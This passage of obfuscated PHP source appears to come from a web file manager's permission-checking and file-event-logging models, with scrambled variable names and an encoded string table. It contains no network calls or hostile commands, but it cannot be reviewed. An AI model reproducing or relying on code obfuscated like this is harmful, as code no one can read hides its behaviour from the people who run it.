$Á¦ØŒ¼¢); if ($ˆïÄ“õ–) { $‡‚ãâŒ… = array(array($Üü€ş[191] => SourceModel::TYPE_USER, $Üü€ş[583] => $Á¦ØŒ¼¢), array($Üü€ş[191] => SourceModel::TYPE_GROUP, $Üü€ş[583] => array($Üü€ş[504], $ˆïÄ“õ–)), $Üü€ş[1092] => $Üü€ş[2099]); } $Ä»ßçˆÒ = $this->field($Üü€ş[2202])->where($‡‚ãâŒ…)->select(); $¥Ò¦ğ‡µ = array(); $ùõœ¬ì‘ = array_to_keyvalue_group($Ä»ßçˆÒ, $Üü€ş[194]); foreach ($ùõœ¬ì‘ as $´¾™ïøÈ => $ÆÒìÔ™¡) { $ÛúûÇŒ = $this->authArrayCheck($ÆÒìÔ™¡, $Á¦ØŒ¼¢); if ($ÛúûÇŒ[$Üü€ş[500]] > 0) { $¥Ò¦ğ‡µ[] = $´¾™ïøÈ . $Üü€ş[12]; } } if ($ˆïÄ“õ–) { $Ã¥õø±Ö = Model($Üü€ş[599]); foreach ($ˆïÄ“õ– as $ã‚¿‹Ğ) { $Ç…ÊÁÁ = $Ã¥õø±Ö->getInfo($ã‚¿‹Ğ); if (!$Ç…ÊÁÁ || !is_array($Ç…ÊÁÁ[$Üü€ş[90]])) { continue; } $¥Ò¦ğ‡µ[] = $Ç…ÊÁÁ[$Üü€ş[90]][$Üü€ş[194]]; } } $Ç¦¿ç† = array(); $¡ıË¿©ø = $ˆïÄ“õ–; $¼Óİï¨Ü = Model($Üü€ş[1445]); $Ã¥õø±Ö = Model($Üü€ş[599]); $„‘˜Ì´¹ = array(); $€¸¦·¡Å = array(); $ğŞóÜ‹¬ = array(); $Õşœ± = array(); if ($¥Ò¦ğ‡µ) { $†Ò•• = $¼Óİï¨Ü->where(array($Üü€ş[194] => array($Üü€ş[504], $¥Ò¦ğ‡µ)))->select(); foreach ($†Ò•• as $“ÄÆÅè¸) { if ($“ÄÆÅè¸[$Üü€ş[517]] == $Üü€ş[91]) { continue; } $±ºœÖ­… = $¼Óİï¨Ü->parentLevelArray($“ÄÆÅè¸[$Üü€ş[598]]); $Ç¦¿ç† = array_merge($Ç¦¿ç†, $±ºœÖ­…); $¡ıË¿©ø[] = $“ÄÆÅè¸[$Üü€ş[583]]; $„‘˜Ì´¹[$“ÄÆÅè¸[$Üü€ş[194]]] = $±ºœÖ­…; $€¸¦·¡Å[$“ÄÆÅè¸[$Üü€ş[194]]] = $“ÄÆÅè¸[$Üü€ş[583]]; } } $¡ıË¿©ø = array_values(array_unique($¡ıË¿©ø)); $ÅĞ·Ã¤ˆ = $¡ıË¿©ø; foreach ($ÅĞ·Ã¤ˆ as $ã‚¿‹Ğ) { $Ç…ÊÁÁ = $Ã¥õø±Ö->getInfo($ã‚¿‹Ğ); $±ºœÖ­… = $¼Óİï¨Ü->parentLevelArray($Ç…ÊÁÁ[$Üü€ş[598]]); $¡ıË¿©ø = array_merge($¡ıË¿©ø, $±ºœÖ­…); } $¡ıË¿©ø = array_values(array_unique($¡ıË¿©ø)); foreach ($¡ıË¿©ø as $ã‚¿‹Ğ) { $Ç…ÊÁÁ = $Ã¥õø±Ö->getInfo($ã‚¿‹Ğ); $Ç¦¿ç†[] = $Ç…ÊÁÁ[$Üü€ş[90]][$Üü€ş[194]]; $ğŞóÜ‹¬[$ã‚¿‹Ğ] = $Ç…ÊÁÁ[$Üü€ş[90]][$Üü€ş[194]]; $Õşœ±[$ã‚¿‹Ğ] = $¼Óİï¨Ü->parentLevelArray($Ç…ÊÁÁ[$Üü€ş[598]]); } foreach ($„‘˜Ì´¹ as $¼­˜­µ„ => $¬ÊÃØÀà) { $ËšÅ‚¿¡ = $€¸¦·¡Å[$¼­˜­µ„]; if (!$ËšÅ‚¿¡ || !$ğŞóÜ‹¬[$ËšÅ‚¿¡]) { continue; } $û§¹†¾ = array(); foreach ($Õşœ±[$ËšÅ‚¿¡] as $ã‚¿‹Ğ) { $û§¹†¾[] = $ğŞóÜ‹¬[$ã‚¿‹Ğ]; } $„‘˜Ì´¹[$¼­˜­µ„] = array_merge($û§¹†¾, $¬ÊÃØÀà); } $Ç¦¿ç† = array_values(array_unique($Ç¦¿ç†)); $„ıæ½üä = array($Üü€ş[2194] => $Ç¦¿ç†, $Üü€ş[2195] => $„‘˜Ì´¹); $çÊˆ—¹[$Á¦ØŒ¼¢] = $„ıæ½üä; return $„ıæ½üä; } private function makeSourceAuth($Ÿ¡ğŞˆü, $¶†á¿Ùì, $¾çğ¾–É = false) { $å©é¶™ç =& $_SERVER[´‹ô¯Œ]; $çïŠÂ“„ = $å©é¶™ç[91]; $ĞäéÃš› = $Ÿ¡ğŞˆü[$å©é¶™ç[583]]; $×™Œ‚¾ˆ = $Ÿ¡ğŞˆü[$å©é¶™ç[191]] == SourceModel::TYPE_GROUP; $‡ŠÌœùŒ = $×™Œ‚¾ˆ ? $this->groupRootAuth($ĞäéÃš›, $¾çğ¾–É) : !1; if ($‡ŠÌœùŒ && Model($å©é¶™ç[585])->authCheckAction($‡ŠÌœùŒ[$å©é¶™ç[499]], $å©é¶™ç[2017])) { return $this->groupAuthInfo($‡ŠÌœùŒ, $ĞäéÃš›); } $ûŸÃ¿± = Model($å©é¶™ç[1445])->parentLevelArray($Ÿ¡ğŞˆü[$å©é¶™ç[598]]); $ûŸÃ¿± = array_merge(array($Ÿ¡ğŞˆü[$å©é¶™ç[194]]), array_reverse($ûŸÃ¿±)); $öÉç•Ä’ = !1; foreach ($ûŸÃ¿± as $›é¼¸ó´) { if (!isset($¶†á¿Ùì[$›é¼¸ó´])) { continue; } $€İ—ÖÉï = $this->authMake($¶†á¿Ùì[$›é¼¸ó´], $¾çğ¾–É); if ($€İ—ÖÉï[$å©é¶™ç[554]]) { $öÉç•Ä’ = $€İ—ÖÉï; break; } } if (!$×™Œ‚¾ˆ) { return $öÉç•Ä’; } if (!$öÉç•Ä’ && $‡ŠÌœùŒ) { $öÉç•Ä’ = $this->groupAuthInfo($‡ŠÌœùŒ, $ĞäéÃš›); } if (!$öÉç•Ä’) { $—Ò—°ü = Model($å©é¶™ç[599])->getInfo($ĞäéÃš›); $©±‰ÀÏ = explode($å©é¶™ç[50], trim($—Ò—°ü[$å©é¶™ç[598]], $å©é¶™ç[50])); $©±‰ÀÏ = array_reverse($©±‰ÀÏ); foreach ($©±‰ÀÏ as $Š–ãÄŒ¢) { if ($Š–ãÄŒ¢ == $å©é¶™ç[231] || $Š–ãÄŒ¢ == $çïŠÂ“„) { continue; } $¬ùùã±™ = $this->groupRootAuth($Š–ãÄŒ¢, $¾çğ¾–É); if (!$¬ùùã±™) { continue; } $öÉç•Ä’ = $this->groupAuthInfo($¬ùùã±™, $Š–ãÄŒ¢); break; } } if (!$öÉç•Ä’ || $öÉç•Ä’[$å©é¶™ç[500]] <= 0) { $øèè†Ø = $this->authDeepCheck($Ÿ¡ğŞˆü[$å©é¶™ç[194]], $¾çğ¾–É); if ($øèè†Ø) { $öÉç•Ä’ = $øèè†Ø; } } return $öÉç•Ä’; } private function userIsRoot($ä¢¤ıè = false) { $èË±Šê£ =& $_SERVER[´‹ô¯Œ]; if (!$ä¢¤ıè && KodUser::isRoot()) { return !0; } $¨×š² = Model($èË±Šê£[611])->getInfo($ä¢¤ıè); $¼´›²¸ = Model($èË±Šê£[2203])->listData($¨×š²[$èË±Šê£[2204]]); if ($¼´›²¸ && $¼´›²¸[$èË±Šê£[589]][$èË±Šê£[2205]] == 1) { return !0; } return !1; } private function sourceAuthInfo($µå½çÉü) { $®¬”–Áú =& $_SERVER[´‹ô¯Œ]; $Í¨ú…†É = Model($®¬”–Áú[1445]); $©œ«àšŒ = $Í¨ú…†É->sourceInfo($µå½çÉü); if (!$©œ«àšŒ) { return !1; } $Í¨ú…†É->groupPathDisplay($©œ«àšŒ); $÷ºü¾ò  = array($©œ«àšŒ); $÷ºü¾ò  = $Í¨ú…†É->_listAppendPath($÷ºü¾ò ); $©œ«àšŒ = $÷ºü¾ò [0]; $²õšöìÄ = $©œ«àšŒ[$®¬”–Áú[596]]; if (isset($©œ«àšŒ[$®¬”–Áú[604]])) { $“…°¼È = explode($®¬”–Áú[8], trim($©œ«àšŒ[$®¬”–Áú[596]], $®¬”–Áú[8])); array_shift($“…°¼È); $²õšöìÄ = $©œ«àšŒ[$®¬”–Áú[602]] . $®¬”–Áú[2206] . implode($®¬”–Áú[8], $“…°¼È); } return array($®¬”–Áú[506] => $©œ«àšŒ[$®¬”–Áú[32]], $®¬”–Áú[87] => KodIO::make($©œ«àšŒ[$®¬”–Áú[194]]), $®¬”–Áú[2207] => $²õšöìÄ); } private function groupAuthInfo($ –ê¿üÀ, $úç³ùÄÇ) { $¡œÅ“ÒŞ =& $_SERVER[´‹ô¯Œ]; $¦ØÇâÓ« = Model($¡œÅ“ÒŞ[599])->getInfo($úç³ùÄÇ); return array($¡œÅ“ÒŞ[2208] => intval($ –ê¿üÀ[$¡œÅ“ÒŞ[499]]), $¡œÅ“ÒŞ[2191] => $ –ê¿üÀ, $¡œÅ“ÒŞ[2209] => LNG($¡œÅ“ÒŞ[2210]), $¡œÅ“ÒŞ[2200] => array($¡œÅ“ÒŞ[506] => $¦ØÇâÓ«[$¡œÅ“ÒŞ[32]], $¡œÅ“ÒŞ[87] => KodIO::make($¦ØÇâÓ«[$¡œÅ“ÒŞ[90]][$¡œÅ“ÒŞ[194]]), $¡œÅ“ÒŞ[2207] => $¦ØÇâÓ«[$¡œÅ“ÒŞ[603]])); } protected function groupRootAuth($¤šµ¦è…, $Ú—¡Èƒù = false) { $ ²š£©Ò =& $_SERVER[´‹ô¯Œ]; $Ú—¡Èƒù = $Ú—¡Èƒù ? $Ú—¡Èƒù : USER_ID; $òÒšÏ = $Ú—¡Èƒù . $ ²š£©Ò[2211] . $¤šµ¦è…; static $©ƒÆ²ù» = array(); if (isset($©ƒÆ²ù»[$òÒšÏ])) { return $©ƒÆ²ù»[$òÒšÏ]; } $ĞÄÌš´ˆ = Model($ ²š£©Ò[599])->getInfo($¤šµ¦è…); $Ú²«Ãô– = $this->userGroupList($Ú—¡Èƒù); $©ö¯ğ€Ğ = isset($Ú²«Ãô–[$¤šµ¦è…]) ? $Ú²«Ãô–[$¤šµ¦è…][$ ²š£©Ò[499]] : !1; if ($©ö¯ğ€Ğ && Model($ ²š£©Ò[585])->authCheckAction($©ö¯ğ€Ğ[$ ²š£©Ò[499]], $ ²š£©Ò[2017])) { $©ƒÆ²ù»[$òÒšÏ] = $©ö¯ğ€Ğ; return $©ö¯ğ€Ğ; } $²¨…íËŞ = $this->sourceAuthSelect($ĞÄÌš´ˆ[$ ²š£©Ò[90]][$ ²š£©Ò[194]]); $§ÑÍùéï = $²¨…íËŞ ? $this->authMake($²¨…íËŞ, $Ú—¡Èƒù) : !1; $×½÷øäÏ = $§ÑÍùéï ? $§ÑÍùéï[$ ²š£©Ò[554]] : !1; $©ƒÆ²ù»[$òÒšÏ] = $×½÷øäÏ ? $×½÷øäÏ : $©ö¯ğ€Ğ; return $©ƒÆ²ù»[$òÒšÏ]; } public function authOwnerApply($š£°Ô¤½) { $Ò„Û¤„Õ =& $_SERVER[´‹ô¯Œ]; if (empty($š£°Ô¤½[$Ò„Û¤„Õ[499]]) || isset($š£°Ô¤½[$Ò„Û¤„Õ[2212]]) && $š£°Ô¤½[$Ò„Û¤„Õ[2212]]) { return $š£°Ô¤½; } if (AuthModel::authCheckRoot($š£°Ô¤½[$Ò„Û¤„Õ[499]][$Ò„Û¤„Õ[500]])) { return $š£°Ô¤½; } $á¸õ›Ş€ = Model($Ò„Û¤„Õ[1445])->parentLevelArray($š£°Ô¤½[$Ò„Û¤„Õ[598]]); $á¸õ›Ş€ = array_merge(array($š£°Ô¤½[$Ò„Û¤„Õ[194]]), array_reverse($á¸õ›Ş€)); $îºµò˜¢ = $this->sourceAuthSelect($á¸õ›Ş€); $õ¤ğ€²ñ = array(); $•ÈÊùœ® = array(); foreach ($îºµò˜¢ as $•×¸İ™Ä => $”¢ƒÁŠ³) { $ÇÊ†ìà— = $this->authFolderOwnerUser($”¢ƒÁŠ³); $õ¤ğ€²ñ[$•×¸İ™Ä] = $ÇÊ†ìà—; $•ÈÊùœ® = array_merge($•ÈÊùœ®, $ÇÊ†ìà—[$Ò„Û¤„Õ[679]]); if ($ÇÊ†ìà—[$Ò„Û¤„Õ[2213]]) { break; } } if (count($•ÈÊùœ®) == 0) { $•ÈÊùœ® = $this->authFolderOwnerGroup($š£°Ô¤½[$Ò„Û¤„Õ[583]]); } $•ÈÊùœ® = array_unique($•ÈÊùœ®); if (AuthModel::authCheckRoot($š£°Ô¤½[$Ò„Û¤„Õ[499]][$Ò„Û¤„Õ[500]])) { $•ÈÊùœ®[] = USER_ID; } $š£°Ô¤½[$Ò„Û¤„Õ[499]][$Ò„Û¤„Õ[2214]] = Model($Ò„Û¤„Õ[591])->userListInfo($•ÈÊùœ®); return $š£°Ô¤½; } private function authFolderOwnerGroup($”ğéò›) { $Àâ«®‰ =& $_SERVER[´‹ô¯Œ]; $È£ÄŸæ© = Model($Àâ«®‰[2091])->where(array($Àâ«®‰[1407] => $”ğéò›))->select(); $¬ü‰Æµ­ = array(); if (!$È£ÄŸæ©) { return $¬ü‰Æµ­; } foreach ($È£ÄŸæ© as $†ŠÙø—€) { $èŸ¾êß£ = $this->authInfo($†ŠÙø—€); if (AuthModel::authCheckRoot($èŸ¾êß£[$Àâ«®‰[499]])) { $¬ü‰Æµ­[] = $†ŠÙø—€[$Àâ«®‰[1796]]; } } return $¬ü‰Æµ­; } private function authFolderOwnerUser($Ô·ê¹§) { $½É³®· =& $_SERVER[´‹ô¯Œ]; $éæÃØ”ü = array(); $ØÛÒØ¤ğ = !1; foreach ($Ô·ê¹§ as $˜ò½ôİ‚) { $Ê‹÷Èä = $this->authInfo($˜ò½ôİ‚); if ($˜ò½ôİ‚[$½É³®·[583]] == $½É³®·[231]) { $ØÛÒØ¤ğ = !0; } if ($˜ò½ôİ‚[$½É³®·[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ê‹÷Èä[$½É³®·[499]])) { $éæÃØ”ü[] = $˜ò½ôİ‚[$½É³®·[583]]; } } } return array($½É³®·[679] => $éæÃØ”ü, $½É³®·[2213] => $ØÛÒØ¤ğ); } public function authMake($Á§ Ùô, $É€ñ¥’í = false) { $¸é—àì =& $_SERVER[´‹ô¯Œ]; $‡Åòà·ò = $this->authArrayCheck($Á§ Ùô, $É€ñ¥’í); if ($‡Åòà·ò[$¸é—àì[2215]]) { $‡Åòà·ò[$¸é—àì[2215]] = $this->sourceAuthInfo($‡Åòà·ò[$¸é—àì[2215]]); } return $‡Åòà·ò; } public function authArrayCheck($Á“ó† , $İ•Ø† = false) { $¾ªôÔ¾è =& $_SERVER[´‹ô¯Œ]; if (!$Á“ó† ) { return array($¾ªôÔ¾è[500] => 0, $¾ªôÔ¾è[554] => !1); } $İ•Ø† = $İ•Ø† ? $İ•Ø† : USER_ID; $¬êÙ×»× = 0; $ˆƒûøè¬ = 0; $Íõïœñ­ = 0; $€ëãŞ = 0; $”ÏøÇ¼‡ = 0; $ëøê× = 0; $£†ñŞâ = 1000; $Åñ—ª§è = 0; $¦“¿¤‰å = 0; $éõŞÔ´ = 0; $€ùå°©ù = 0; $´Ëùœ´ = array($¾ªôÔ¾è[194] => 0); foreach ($Á“ó†  as $´Ëùœ´) { $¼ó³Î¶« = $this->authInfo($´Ëùœ´); if (!$¼ó³Î¶«) { continue; } $‰¹¤‘¾ = $´Ëùœ´[$¾ªôÔ¾è[583]]; $ğ‚áÑİ´ = intval($¼ó³Î¶«[$¾ªôÔ¾è[499]]); if ($´Ëùœ´[$¾ªôÔ¾è[191]] == SourceModel::TYPE_USER && $‰¹¤‘¾ == $İ•Ø†) { $¬êÙ×»× = !0; $Íõïœñ­ = $¼ó³Î¶«; $ˆƒûøè¬ = $ğ‚áÑİ´; } else { if ($´Ëùœ´[$¾ªôÔ¾è[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‰¹¤‘¾, $İ•Ø†)) { $€ëãŞ = !0; $ÓŞ“±´š = $this->groupStepToUserGroup($‰¹¤‘¾, $İ•Ø†); if ($ÓŞ“±´š < $£†ñŞâ) { $£†ñŞâ = $ÓŞ“±´š; $”ÏøÇ¼‡ = $ğ‚áÑİ´; $ëøê× = $¼ó³Î¶«; $Åñ—ª§è = $‰¹¤‘¾; } if ($ÓŞ“±´š == $£†ñŞâ && $ğ‚áÑİ´ >= $”ÏøÇ¼‡) { $”ÏøÇ¼‡ = $ğ‚áÑİ´; $ëøê× = $¼ó³Î¶«; $Åñ—ª§è = $‰¹¤‘¾; } } else { if ($‰¹¤‘¾ == $¾ªôÔ¾è[231]) { $¦“¿¤‰å = !0; $€ùå°©ù = $¼ó³Î¶«; $éõŞÔ´ = $ğ‚áÑİ´; } } } } if ($¬êÙ×»×) { $ãçªËš = $ˆƒûøè¬; $¼ó³Î¶« = $Íõïœñ­; $š»“’ôÕ = LNG($¾ªôÔ¾è[2216]); } else { if ($€ëãŞ) { $ãçªËš = $”ÏøÇ¼‡; $¼ó³Î¶« = $ëøê×; $ª’ÊÓôƒ = Model($¾ªôÔ¾è[599])->getInfo($Åñ—ª§è); $š»“’ôÕ = $¾ªôÔ¾è[176] . $ª’ÊÓôƒ[$¾ªôÔ¾è[603]] . $¾ªôÔ¾è[2217] . LNG($¾ªôÔ¾è[2218]); } else { if ($¦“¿¤‰å) { $ãçªËš = $éõŞÔ´; $¼ó³Î¶« = $€ùå°©ù; $š»“’ôÕ = LNG($¾ªôÔ¾è[2189]); } else { $ãçªËš = 0; $¼ó³Î¶« = !1; $š»“’ôÕ = $¾ªôÔ¾è[12]; } } } $Úé¤Œå± = array($¾ªôÔ¾è[2208] => intval($ãçªËš), $¾ªôÔ¾è[2191] => $¼ó³Î¶«, $¾ªôÔ¾è[2209] => $š»“’ôÕ, $¾ªôÔ¾è[2200] => $´Ëùœ´[$¾ªôÔ¾è[194]]); return $Úé¤Œå±; } private function groupContainUser($Á³Æ·Şè, $Ë¡„Ùø = false) { return in_array($Á³Æ·Şè, $this->userGroupParents($Ë¡„Ùø)); } private function groupStepToUserGroup($İğ˜Ì˜, $»ó¢ù”¶ = false) { $ØÊÖº É =& $_SERVER[´‹ô¯Œ]; $´üï•à = $this->userGroupList($»ó¢ù”¶); $ˆ”À„—› = 1000; $ÆÜËîöï = $GLOBALS[$ØÊÖº É[6]][$ØÊÖº É[92]][$ØÊÖº É[2104]] == 1; $İ¼Ïï« = $ÆÜËîöï ? 3 : 2; foreach ($´üï•à as $²Æ’è·¿) { if ($²Æ’è·¿[$ØÊÖº É[1407]] == $İğ˜Ì˜) { return 0; } $«ÙØ¹µæ = explode($ØÊÖº É[50], trim($²Æ’è·¿[$ØÊÖº É[598]], $ØÊÖº É[50])); if ($«ÙØ¹µæ[0] == $ØÊÖº É[231] && count($«ÙØ¹µæ) > $İ¼Ïï«) { $”Ø©õŸ¼ = array_reverse(array_slice($«ÙØ¹µæ, $İ¼Ïï«)); $¥°¬’ı = array_search($İğ˜Ì˜, $”Ø©õŸ¼); if ($¥°¬’ı !== !1 && $¥°¬’ı + 1 <= $ˆ”À„—›) { $ˆ”À„—› = $¥°¬’ı + 1; } } } return $ˆ”À„—›; } private function userGroupList($¤³À’ğÄ = false) { $ÄâßÀÑ÷ =& $_SERVER[´‹ô¯Œ]; static $ô¼îÁô’ = array(); if (isset($ô¼îÁô’[$¤³À’ğÄ])) { return $ô¼îÁô’[$¤³À’ğÄ]; } $¸è÷¹¦ = Model($ÄâßÀÑ÷[611])->getInfo($¤³À’ğÄ); $ô¼îÁô’[$¤³À’ğÄ] = array_to_keyvalue($¸è÷¹¦[$ÄâßÀÑ÷[1406]], $ÄâßÀÑ÷[1407]); return $ô¼îÁô’[$¤³À’ğÄ]; } public function userGroupParents($¯´×Â‹‹) { $Û€Ï¦»¢ =& $_SERVER[´‹ô¯Œ]; static $¤ë¢ˆğ˜ = array(); $¯´×Â‹‹ = $¯´×Â‹‹ ? $¯´×Â‹‹ : USER_ID; if (isset($¤ë¢ˆğ˜[$¯´×Â‹‹])) { return $¤ë¢ˆğ˜[$¯´×Â‹‹]; } $ß…ºíØ‰ = $this->userGroupList($¯´×Â‹‹); $Á‡È–Ä³ = array(); $¥ÀÈ¤å‹ = $GLOBALS[$Û€Ï¦»¢[6]][$Û€Ï¦»¢[92]][$Û€Ï¦»¢[2104]] == 1; $Ù•Èº¨ë = $¥ÀÈ¤å‹ ? 3 : 2; foreach ($ß…ºíØ‰ as $ÜíÒäó) { $¬ª £Öµ = array($ÜíÒäó[$Û€Ï¦»¢[1407]]); $Š§Íê‚ç = explode($Û€Ï¦»¢[50], trim($ÜíÒäó[$Û€Ï¦»¢[598]], $Û€Ï¦»¢[50])); if ($Š§Íê‚ç[0] == $Û€Ï¦»¢[231] && count($Š§Íê‚ç) > $Ù•Èº¨ë) { $Ü¹½‚´° = array_slice($Š§Íê‚ç, $Ù•Èº¨ë); $¬ª £Öµ = array_merge($¬ª £Öµ, array_reverse($Ü¹½‚´°)); } $Á‡È–Ä³ = array_merge($Á‡È–Ä³, $¬ª £Öµ); } $¤ë¢ˆğ˜[$¯´×Â‹‹] = array_unique($Á‡È–Ä³); return $¤ë¢ˆğ˜[$¯´×Â‹‹]; } public function authTargetInfoMake($ÎÅşš) { $‚‰Îğıè =& $_SERVER[´‹ô¯Œ]; $â Í¶Ù = array(); $ÀÔ¯» = array(); foreach ($ÎÅşš as $²´ªŒ’Æ) { if ($²´ªŒ’Æ[$‚‰Îğıè[191]] == SourceModel::TYPE_USER) { $â Í¶Ù[] = intval($²´ªŒ’Æ[$‚‰Îğıè[583]]); } else { if ($²´ªŒ’Æ[$‚‰Îğıè[191]] == SourceModel::TYPE_GROUP) { $ÀÔ¯»[] = intval($²´ªŒ’Æ[$‚‰Îğıè[583]]); } } } if ($â Í¶Ù) { $â Í¶Ù = Model($‚‰Îğıè[591])->userListInfo($â Í¶Ù); } if ($ÀÔ¯») { $á“¿–¬æ = array($‚‰Îğıè[2086] => array($‚‰Îğıè[504], $ÀÔ¯»)); $ÀÔ¯» = Model($‚‰Îğıè[599])->field($‚‰Îğıè[2219])->where($á“¿–¬æ)->select(); $ÀÔ¯» = array_to_keyvalue($ÀÔ¯», $‚‰Îğıè[1407]); } return array($‚‰Îğıè[2220] => $â Í¶Ù, $‚‰Îğıè[2221] => $ÀÔ¯»); } public function authInfo($îì³•Ò¨) { $âĞÍ³¤á =& $_SERVER[´‹ô¯Œ]; if ($îì³•Ò¨[$âĞÍ³¤á[2105]]) { $´…ğîËõ = Model($âĞÍ³¤á[585])->listData($îì³•Ò¨[$âĞÍ³¤á[2105]]); if (!$´…ğîËõ) { return !1; $ÍêåÈ» = Model($âĞÍ³¤á[585])->listData(); $¬š×§¯å = array_filter_by_field($ÍêåÈ», $âĞÍ³¤á[499], $âĞÍ³¤á[231]); return $¬š×§¯å; } $‘¯ôËŠ = array_field_key($´…ğîËõ, array($âĞÍ³¤á[487], $âĞÍ³¤á[32], $âĞÍ³¤á[499], $âĞÍ³¤á[2019], $âĞÍ³¤á[2020])); $‘¯ôËŠ[$âĞÍ³¤á[2222]] = $îì³•Ò¨; return $‘¯ôËŠ; } else { return array($âĞÍ³¤á[505] => 0, $âĞÍ³¤á[2002] => $îì³•Ò¨[$âĞÍ³¤á[2168]], $âĞÍ³¤á[506] => $âĞÍ³¤á[12], $âĞÍ³¤á[2019] => $âĞÍ³¤á[2223]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\x63\145\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\151\156\x73\145\162\164\x2c\165\160\x64\x61\164\x65\54\163\145\x6c\145\x63\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($²ôîë·Â, $ô¾€ó¨ô, $óÎ²Ü“ê = '') { $ÃÇşÂğ =& $_SERVER[´‹ô¯Œ]; if (!$this->eventSave) { return; } $ÎÛ®¾öü = Model($ÃÇşÂğ[1445])->sourceInfo($²ôîë·Â); if (!$ÎÛ®¾öü) { return !1; } if ($this->isDisableEvent($ÎÛ®¾öü, $ô¾€ó¨ô)) { return; } if ($óÎ²Ü“ê && is_string($óÎ²Ü“ê)) { $óÎ²Ü“ê = array($ÃÇşÂğ[2035] => $óÎ²Ü“ê); } $±ë¬ˆû = defined($ÃÇşÂğ[2224]) ? USER_ID : 0; $ÓİÏİÅÓ = array($ÃÇşÂğ[503] => $²ôîë·Â, $ÃÇşÂğ[2225] => $ÎÛ®¾öü[$ÃÇşÂğ[193]], $ÃÇşÂğ[2226] => $ÎÛ®¾öü[$ÃÇşÂğ[32]], $ÃÇşÂğ[596] => !empty($ÎÛ®¾öü[$ÃÇşÂğ[596]]) ? $ÎÛ®¾öü[$ÃÇşÂğ[596]] : $ÃÇşÂğ[12], $ÃÇşÂğ[1787] => $±ë¬ˆû, $ÃÇşÂğ[508] => $ô¾€ó¨ô, $ÃÇşÂğ[1789] => $óÎ²Ü“ê); $this->addSystemLog($ô¾€ó¨ô, $ÓİÏİÅÓ); unset($ÓİÏİÅÓ[$ÃÇşÂğ[2226]], $ÓİÏİÅÓ[$ÃÇşÂğ[596]]); return $this->add($ÓİÏİÅÓ); } private function addSystemLog($ğ¤ÖöŒæ, $Â‰İÃöÇ) { $±ŒÏ÷­å =& $_SERVER[´‹ô¯Œ]; if ($ğ¤ÖöŒæ == $±ŒÏ÷­å[2227]) { $ğ¤ÖöŒæ = $Â‰İÃöÇ[$±ŒÏ÷­å[538]][$±ŒÏ÷­å[2228]]; } else { if (in_array($ğ¤ÖöŒæ, array($±ŒÏ÷­å[1976], $±ŒÏ÷­å[2229]))) { $ğ¤ÖöŒæ = $Â‰İÃöÇ[$±ŒÏ÷­å[538]][$±ŒÏ÷­å[171]]; } } $Ş†÷ºØ = array_merge($Â‰İÃöÇ, array($±ŒÏ÷­å[2230] => $Â‰İÃöÇ[$±ŒÏ÷­å[194]], $±ŒÏ÷­å[2231] => $Â‰İÃöÇ[$±ŒÏ÷­å[2231]])); Hook::trigger($±ŒÏ÷­å[2232], $±ŒÏ÷­å[2233] . $ğ¤ÖöŒæ, $Â‰İÃöÇ); Model($±ŒÏ÷­å[1940])->addLog($±ŒÏ÷­å[2233] . $ğ¤ÖöŒæ, $Ş†÷ºØ); } private function isDisableEvent($¹½Æõš†, $–ºÒ¯—Ä) { $ğ«‰ÑÆ· =& $_SERVER[´‹ô¯Œ]; if ($¹½Æõš†[$ğ«‰ÑÆ·[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($–ºÒ¯—Ä == $ğ«‰ÑÆ·[1965]) { return !1; } return !0; } public function eventCreate($®Œôùû, $›¥—ÉíĞ) { $ÂÎÊ†Ã‚ =& $_SERVER[´‹ô¯Œ]; $²£­ôí = Model($ÂÎÊ†Ã‚[1445])->sourceInfo($®Œôùû); $òÒŸÊü = array($ÂÎÊ†Ã‚[2228] => $›¥—ÉíĞ, $ÂÎÊ†Ã‚[32] => $²£­ôí[$ÂÎÊ†Ã‚[32]]); return $this->addEvent($®Œôùû, $ÂÎÊ†Ã‚[2227], $òÒŸÊü); } public function eventFileEdit($¤™ùªÈˆ) { $œåõ¥Æ =& $_SERVER[´‹ô¯Œ]; $¢ñ»¯Ù = array($œåõ¥Æ[2234] => $_SERVER[$œåõ¥Æ[2235]], $œåõ¥Æ[2236] => strtolower(ACTION)); if (isset($GLOBALS[$œåõ¥Æ[7]][$œåõ¥Æ[2237]])) { $¢ñ»¯Ù[$œåõ¥Æ[2237]] = $œåõ¥Æ[91]; } return $this->addEvent($¤™ùªÈˆ, $œåõ¥Æ[1966], $¢ñ»¯Ù); } public function eventRecycle($û—¹¿çØ, $©ŸÀ©®º) { return $this->addEvent($û—¹¿çØ, $_SERVER[´‹ô¯Œ][2229], $©ŸÀ©®º); } private static $_removeLast = ''; public function eventRemove($ó§±¸ãò) { $§×¢Áã =& $_SERVER[´‹ô¯Œ]; self::$_removeLast = $ó§±¸ãò; $ß¥õÈÍß = Model($§×¢Áã[1445])->sourceInfo($ó§±¸ãò); $ğê‰Ì›ª = array_field_key($ß¥õÈÍß, array($§×¢Áã[194], $§×¢Áã[555], $§×¢Áã[517], $§×¢Áã[598])); $ÈúÂ³‘¨ = array($§×¢Áã[171] => $ß¥õÈÍß[$§×¢Áã[32]], $§×¢Áã[2236] => ACTION, $§×¢Áã[2238] => $ğê‰Ì›ª); return $this->addEvent($ß¥õÈÍß[$§×¢Áã[193]], $§×¢Áã[1965], $ÈúÂ³‘¨); } public function eventShare($ìÙ˜¡¸Ç, $õ´ÑÑé½) { return $this->addEvent($ìÙ˜¡¸Ç, $_SERVER[´‹ô¯Œ][1976], $õ´ÑÑé½); } public function eventMove($“î÷öâé, $ãíÇÓ©®, $ïÊïá¨÷) { $Åë¼úĞ… =& $_SERVER[´‹ô¯Œ]; if (self::$_removeLast == $“î÷öâé) { return; } $ÈÌø©ƒ = Model($Åë¼úĞ…[1445]); $á•‰ú = $ÈÌø©ƒ->sourceInfo($“î÷öâé); $ÉÒÌÍå = $ÈÌø©ƒ->sourceInfo($ãíÇÓ©®); $³¸éÓ±É = $ÈÌø©ƒ->sourceInfo($ïÊïá¨÷); $Û©òÂÚÇ = array($Åë¼úĞ…[1256] => $ãíÇÓ©®, $Åë¼úĞ…[2239] => 